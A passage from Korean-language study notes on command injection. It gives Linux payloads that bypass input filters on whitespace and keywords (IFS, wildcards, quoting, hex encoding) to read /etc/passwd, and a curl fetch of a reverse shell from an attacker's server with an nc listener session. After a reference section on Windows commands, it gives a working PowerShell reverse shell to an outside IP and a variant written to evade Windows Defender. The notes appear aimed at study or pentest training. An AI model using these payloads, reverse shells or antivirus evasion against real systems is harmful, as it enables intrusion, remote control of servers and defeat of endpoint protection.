            + ```curl``` 명령은 변환된 long 타입의 IP 주소(```2130706433```)를 해석하여 공격 대상 서버에서 공격자 웹 서버에 리버스 쉘을 실행하는 스크립트를 받아옴 → 이를 실행하면 쉘을 획득할 수 있음
        - [4] 3번의 명령어가 성공적으로 실행되게 되면 리버스 쉘이 실행됨
            ```linux
            $ nc -l -p 1234 -k -v
            Listening on [0.0.0.0] (family 0, port 1234)
            Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 53220)
            $ id
            uid=1000(users) gid=1000(users) groups=1000(users)
            $
            ```

<br/><br/>

### 입력 값의 내용이 제한된 상황
* Command Injection 취약점이 발생하지만 입력하는 데이터 내용에 대한 검증 또는 어플리케이션 로직에 의해 원하는 내용을 직접적으로 입력하지 못하는 상황에서 사용할 수 있는 방법 <br/> &nbsp;&nbsp; → ⚠️ 주로 **쉘에서 제공하는 기능** 또는 **환경 변수** 등을 이용하여 최종적으로 원하는 명령어를 실행할 수 있음

<br/>

* 애플리케이션에서 공백 문자(Whitespace)를 필터링할 경우
    - ```${IFS}```, ```$IFS```를 공백 문자 대신 사용하여 우회하는 방법
        ```linux
        cat${IFS}/etc/passwd
        cat$IFS/etc/passwd
        ```
        + **IFS**(Internal Field Separtor): 외부 프로그램 실행 시 **입력되는 문자열을 나눌 때 기준이 되는 문자**를 정의하는 환경변수
            - 리눅스 터미널에서 ```echo $IFS```로 환경 변수를 출력해보면 공백 문자가 출력되는 것을 확인할 수 있음
            - 디폴트 값은 공백(space)/탭(tab)/개행(new line) 문자임
    - 변수를 선언하여 해당 변수에 공백을 대신할 수 있는 문자를 대입한 후 ```${변수}```를 공백 문자 대신 사용하요 우회하는 방법
        ```linux
        X=$'\x20\';cat${X}/etc/passwd
        X=$'\040';cat${X}/etc/passwd
        ```
        + ```${변수}```에서 중괄호로 감싼 변수에 해당하는 값으로 치환됨
    - 중괄호(```{}```)를 이용하거나 입력을 재지정하는 문자 ```<```를 통해 공백 문자를 우회하는 방법
        ```linux
        {cat,/etc/passwd}
        cat</etc/passwd
        ```

<br/>

* 키워드 필터링 우회
    - ```"cat"``` 문자열을 필터링할 경우 우회할 수 있는 방법
        + 리눅스 와일드카드 ```?```, ```*```를 이용하는 방법
            ```linux
            /bin/ca* /etc/passwd
            /bin/c?t /etc/passwd
            ```
            | 와일드카드 문자 | 설명 |
            |:---:|------|
            | ```*``` | 모든 문자를 의미하는 특수문자 (0개 이상의 문자를 대체함) |
            | ```?``` | 하나의 문자를 의미하는 특수문자 (해당 위치의 1개의 문자로 대체함) |
        + ```''```, ```""```, ```\``` 문자를 이용하는 방법
            ```linux
            c''a""t /etc/passwd
            \c\a\t /etc/passwd
            ```
            | 문자 | 설명 | 예시 |
            |:---:|------|---|
            | ```''``` | 작은 따옴표로 감싸진 문자열을 일반 문자열로 인식하여 아무런 변환 없이 그대로 출력함 |
            | ```""``` | 따옴표 사이의 모든 특수문자를 일반 문자로 인식하지만, 명령어 대체 특수문자, 변수값 대체 특수문자 등 <br/> 몇몇 특수문자들은 예외로 하여 처리함 |
            | ```\``` | 특수문자 앞에 붙어 사용되며 해당 특수문자의 효과를 업해고 일반 문자처럼 처리해줌 <br/> (```\``` 뒤의 딱 한 문자만 처리함) |
        + 쉘 스크립트 변수 ```${}```를 이용하는 방법
            ```linux
            c${invalid_variable}a${XX}t /etc/passwd
            ```
    - ```"id"``` 문자열을 필터링할 경우 우회할 수 있는 방법
        + ```"id"``` 문자열을 변환하여 사용하는 방법
            ```linux
            echo -e "\x69\x64" | sh
            echo $'\151\144' | sh
            ```
        + 변수를 선언하여 해당 변수에 ```"id"``` 문자열을 대신할 수 있는 값을 넣은 후 ```id``` 대신 ```${변수}``` 형태로 사용하는 방법
            ```linux
            X=$"\x69\x64"; sh - c $X
            ```
    - ```"/etc/passwd"``` 문자열을 필터링할 경우 우회할 수 있는 방법
        + ```"/etc/passwd"``` 문자열을 16진수로 변환한 ```"2f6574632f706173737764"```를 사용하는 방법
            ```linux
            xxd -r -p <<< 2f6574632f706173737764
            cat `xxd -r -p <<< 2f6574632f706173737764`
            ```

<br/>

* 주석(Comments) 문자를 이용하는 방법
    - ```#``` 문자를 통해 입력값의 뒷부분을 주석 처리하는 방법
        ```linux
        ping "127.0.0.1"; id # "
        ```

<br/><br/><br/>

## Windows 환경
* 윈도우에서 명령어를 실행하기 위해 cmd.exe 또는 파워쉘(Powershell)을 사용할 수 있음
    - cmd.exe와 파워셸은 같은 운영체제 상에서 구동되지만 각 인터프리터에서 제공하는 문자와 기능은 서로 다름

<br/><br/>

### Windows와 Linux 비교
* 쉘 메타문자 비교
    | Linux | Windows (cmd, powershell) | 설명 |
    |---|---|:---:|
    | ```-A```, ```--A``` | ```/c``` | 커맨드 라인 옵션 |
    | ```$PATH``` | ```%PATH%``` | 환경 변수 |
    | ```$ABCD``` | ```$AVCD``` (powershell only) | 쉘 변수 |
    | ```;``` | ```&``` (cmd only) <br/> ```;``` (powershell only) | 명령어 구분자 |
    | ```echo $(id)``` | ```for /f "delims=" %a in ('whoami') dp echo %a``` | 명령어 치환 |
    | ```> /dev/null``` | ```> NUL``` (cmd only) <br/> ```\| Out-Null``` (powershell only) | 출력 제거 |
    | ```command \|\| true``` | ```command & rem``` (cmd only) <br/> ```command -ErrorAction SilentlyContinue``` (powershell only) | ```command``` 명령어 오류 무시 |

<br/>

* Windows Command(명령어)
    - 디렉터리(폴더) 파일 목록 출력: **```dir```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir)
        + 디렉터리의 파일 및 하위 디렉터리 목록을 표시하는 명령어 *→ 리눅스 명령어 ```ls```와 대응됨*
        + ```dir``` 명령어 형식
            ```
            dir [<drive>:][<path>][<filename>] [...] [/p] [/q] [/w] [/d] [/a[[:]<attributes>]][/o[[:]<sortorder>]] [/t[[:]<timefield>]] [/s] [/b] [/l] [/n] [/x] [/c] [/4] [/r]
            ```
            - 매개변수 없이 사용하는 경우 디스크의 볼륨 레이블 및 일련 번호의 디스크의 디렉터리 파일 목록을 표시함
            - 중요 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```[<drive>:]``` <br/> ```[<path>]``` | 목록을 보려는 드라이브 및 디렉터리를 지정함 |
                | ```<filename>``` | 목록을 보려는 특정 파일 또는 파일 그룹을 지정함 <br/> (여러 파일 이름 매개변수를 사용하기 위해서 공백, 쉼표, 또는 세미콜론으로 구분함) |
                | ```/q``` | 파일 소유권 정보를 표시함 |
                | ```/a[[:]<attributes>]``` | 지정된 특성이 있는 해당 디렉터리 및 파일의 이름만 표시함 <br/> &nbsp;&nbsp; - 해당 매개변수를 사용하지 않으면 숨겨진 파일과 시스템 파일을 제외한 모든 파일의 이름을 표시함 <br/> &nbsp;&nbsp; - 특성(attributes)를 지정하지 않고 사용하는 경우 숨겨진 파일과 시스템 파일을 포함한 모든 파일의 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 이름을 표시함 |
                | ```/s``` | 지정된 디렉터리와 모든 하위 디렉터리 내에서 지정된 파일 이름의 모든 항목을 나열함 |
    - 파일 내용 출력: **```type```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
        + 파일의 내용을 표시하는 명령어 *→ 리눅스 명령어 ```cat```과 대응됨*
        + ```type``` 명령어 형식
            ```
            type [<drive>:][<path>]<filename>
            ```
            - 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```[<drive>:][<path>]<filename>``` | 보려는 파일(들)의 위치와 이름을 지정함 <br/> &nbsp;&nbsp; - ```<filename>```에 공백이 포함된 경우 따옴표(```"```)로 묶어야 함 <br/> &nbsp;&nbsp; - 여러 파일 이름 사이에 공백을 추가하여 나열할 수 있음 |
    - 디렉터리(폴더) 이동: **```cd```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cd)
        + 현재 디렉터리의 이름을 표시하거나 현재 디렉터리를 변경하는 명령여(```chdir``` 명령어와 동일함) *→ 리눅스 명령어 ```cd```와 대응됨*
        + ```cd``` 명령어 형식
            ```
            cd [/d] [<drive>:][<path>]
            cd [..]
            chdir [/d] [<drive>:][<path>]
            chdir [..]
            ```
            - 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```/d``` | 드라이브에 대한 현재 디렉터리와 현재 드라이브를 변경함 |
                | ```<drive>:```| 드라이브 간 이동을 위해 사용함 |
                | ```<path>``` | 이동하려는 디렉터리의 경로를 지정하면 지정한 경로로 현재 디렉터리를 변경함 |
                | ```..``` | 상위 디렉터리로 이동함 |
                | ```\``` | 루트로 이동함 |
    - 파일 삭제: **```del```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
        + 하나 이상의 파일을 삭제하는 명령어 (```erase``` 명령어와 동일한 작업을 수행함) *→ 리눅스 명령어 ```rm```와 대응됨*
        + ```del``` 명령어 형식
            ```
            del [/p] [/f] [/s] [/q] [/a[:]<attributes>] <names>
            ```
            - 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```<names>``` | 하나 이상의 파일 또는 디렉터리 목록을 지정함 <br/> &nbsp;&nbsp; - 여러 파일을 삭제하려면 와일드카드(```*```)를 사용할 수 있음 <br/> &nbsp;&nbsp; - 디렉터리를 지정하면 디렉터리 내의 모든 파일이 삭제됨 |
                | ```/p``` | 지정된 파일을 삭제하기 전에 확인 메시지를 표시함 |
                | ```/f``` | 읽기 전용 파일을 강제로 삭제함 (force) |
                | ```/s``` | 지정된 현재 디렉터리와 모든 하위 디렉터리에서 파일을 삭제함 (삭제될 파일의 이름을 표시함) |
                | ```/q``` | 자동 모드를 지정함 (삭제 확인 불필요) |
                | ```/a[:]<attributes>``` | 파일 특성(attributes)에 따라 파일을 삭제함 |
    - 파일 이동: **```move```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/move)
        + 한 디렉터리에서 하나 이상의 파일을 다른 디렉터리로 이동시키는 명령어 *→ 리눅스 명령어 ```mv```와 대응됨*
        + ```move``` 명령어 형식
            ```
            move [{/y|-y}] [<source>] [<target>]
            ```
            - 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```/y``` | 기존 대상 파일을 덮어쓸지 확인하는 메시지를 중지함 |
                | ```-y``` | 기존 대상 파일을 덮어쓸 것인지 확인하는 메시지를 표시하기 시작함 |
                | ```<source>``` | 이동한 파일의 경로와 이름을 지정함 <br/> &nbsp;&nbsp; - 디렉터리를 이동하거나 이름을 바꾸려면 ```source```가 현재 디렉터리 경로 및 이름이어야 함 |
                | ```<target>``` | 이동할 파일의 경로와 이름을 지정함 <br/> &nbsp;&nbsp; - 디렉터리를 이동하거나 이름을 바꾸기 위해서는 ```target```이 대상 디렉터리 경로 및 이름이어야 함 |
    - 파일 복사: **```copy```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/copy)
        + 다른 한 위치에서 하나 이상의 파일을 복사하는 명령어 *→ 리눅스 명령어 ```cp```와 대응됨*
        + ```copy``` 명령어 형식
            ```
            copy [/d] [/v] [/n] [/y | /-y] [/z] [/a | /b] <source> [/a | /b] [+<source> [/a | /b] [+ ...]] [<destination> [/a | /b]]
            ```
            - 중요 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```<source>``` | [required] 복사할 파일 또는 파일 목록을 지정함 <br/> (드라이브 문자 및 콜론, 디렉터리 이름, 파일 이름 등으로 구성될 수 있음) |
                | ```<destination>``` | [required] 파일 또는 파일 목록이 복사될 위치를 지정함 <br/> (드라이브 문자 및 콜론, 디렉터리 이름, 파일 이름 등으로 구성될 수 있음) |
    - 네트워크 설정: **```ipconfig```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ipconfig)
        + 모든 현재 TCP/IP 네트워크 구성 값을 표시하고 DHCP(Dynamic Host Configuration Protocol) 및 DNS(Domain Name System) 설정을 수행하는 명령어 *→ 리눅스 명령어 ```ifconfig```와 대응됨*
        + ```ipconfig``` 명령어 형식
            ```
            ipconfig [/allcompartments] [/all] [/renew [<adapter>]] [/release [<adapter>]] [/renew6[<adapter>]] [/release6 [<adapter>]] [/flushdns] [/displaydns] [/registerdns] [/showclassid <adapter>] [/setclassid <adapter> [<classID>]]
            ```
            - 매개변수 없이 사용하면 모든 어댑터에 대한 IPv4 및 IPv6 주소, 서브넷 마스크 및 기본 게이트웨이를 표시함
            - 중요 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```/all``` | 모든 어댑터의 전체 TCP/IP 구성을 표시함 |
                | ```/displaydns``` | DNS client resolver cache 내용을 표시함 (DNS client 서비스가 DNS Server에 쿼리하기 전에 <br/> 이 정보를 사용하여 자주 쿼리되는 Domain Name을 빠르게 확인함) |
                | ```/release [<adapter>]``` | DHCP 서버에 DHCPRELEASE 메시지를 전송하여 현재 DHCP 구성을 해제하고 어댑터에 대한 <br/> IP 주소 구성을 삭제함 <br/> &nbsp;&nbsp; - ```<adapter>```가 포함된 경우 해당 어댑터만 삭제, 아니면 전체 어댑터를 삭제함 <br/> &nbsp;&nbsp; - IP 주소를 자동으로 얻도록 구성된 어댑터에 대해 TCP/IP를 비활성화함 |
                | ```/renew [<adapter>]``` | 어댑터에 대한 DHCP 구성을 갱신함 <br/> &nbsp;&nbsp; - ```<adapter>```가 포함된 경우 해당 어댑터만 갱신, 아니면 전체 어댑터를 갱신함 <br/> &nbsp;&nbsp; - IP 주소를 자동으로 얻도록 구성된 어댑터가 존재하는 컴퓨터에서만 사용할 수 있음 |
    - 환경변수 설정: **```set```** [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1)
        + cmd.exe 환경 변수를 표시, 설정 및 제거하는데 사용하는 명령어 *→ 리눅스 명령어 ```env```, ```export```와 대응됨* 
        + ```set``` 명령어 형식
            ```
            set [<variable>=[<string>]]
            set [/p] <variable>=[<promptString>]
            set /a <variable>=<expression>
            ```
            - 매개변수 없이 사용할 경우 현재 환경변수 설정을 표시함
            - 매개변수
                | 매개변수 | 설명 |
                |:---:|------|
                | ```<variable>``` | 설정하거나 수정할 환경변수를 지정함 |
                | ```<string>``` | 특정 환경변수와 연결할 문자열을 지정함 |
                | ```/p``` | ```<variable>```의 값을 사용자의 입력값으로 설정함 |
                | ```<promptString>``` | 사용자에게 이볅하라는 메시지를 지정함 (```/p``` 매개변수와 함께 사용함) |
                | ```/a``` | ```<string>```을 평가하는 숫자 표현식(numerical expression)으로 설정함 |
                | ```<expression>``` | 숫자 표현식을 지정함 |
    - 이 외의 Windows 명령어(Commands)에 대한 내용은 공식 문서를 참고함 [🔗](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

<br/><br/>

### Windows Reverse Shell
* 윈도우도 리눅스와 같이 리버스 쉘 공격이 가능하지만, 아래와 같은 차이점이 존재함
    | 운영체제 | 비교 |
    |:---:|------|
    | Linux | 기본적으로 명령어와 스크립트를 실행하는데 있어 어떠한 제약도 존재하지 않음 |
    | Windows | 윈도우 디펜터(Windows Defender)가 악성 스크립트를 감지하고 이를 실행하지 않음 ***→ 우회 필요*** |

<br/>

* 윈도우 환경의 리버스 쉘 스크립트 예시
    ```powershell
    # Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

    $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
    ```
    - ```"This script contains malicious content and has been blocked by your antivirus software"``` 메시지와 함께 실행에 실패함 <br/> &nbsp;&nbsp; ↳ 스크립트에 악성 데이터가 있어 윈도우 디펜더에 의해 차단되었다는 메시지가 출력됨
    - 📌 Windows Defender 우회
        + 윈도우 디펜더는 악성 코드가 운영체제에서 실행되는 것을 방지함 *→ 리버스 쉘을 통한 공격을 수행하기 위해서는 **윈도우 디펜더 우회가 필수적**임*
        + 리버스 쉘 스크립트를 실행하는 우회 코드
            ```powershell
            $client = New-Object System.Net.Sockets.TCPClient("123.123.124.124",1234);
            $x = Get-Random; # Get-Random 함수를 이용하여 무작위 값을 생성함
            if ($x -ge 1) { # 랜덤으로 생성한 값이 1보다 큰 값인지 확인한 후에 리버스 셸 코드를 실행함
                $stream = $client.GetStream();
                [byte[]]$bytes = 0..65535|%{0};
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                    $sendback = (iex $data 2>&1 | Out-String );
                    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                    $stream.Write($sendbyte,0,$sendbyte.Length);
                    $stream.Flush()
                };
                $client.Close();
            } else {
                $client.Close();
            }
            ```
            - ```Get-Random``` 함수를 이용하여 생성한 무작위 값이 1보다 큰 값인지 확인한 후에 리버스 쉘 코드를 실행함 <br/> &nbsp;&nbsp; → 윈도우 디펜더는 이 조건문이 **함수 실행 결과에 영향을 받는 것으로 판단**하여 스크립트 실행을 허용함
            - 우회 스크립트가 성공적으로 동작하면 리버스 쉘이 동작함 → 서버에 시스템 명령어를 실행시키고 그 결과를 확인할 수 있음

<br/><br/><br/>

## Command Injection Bug Cases
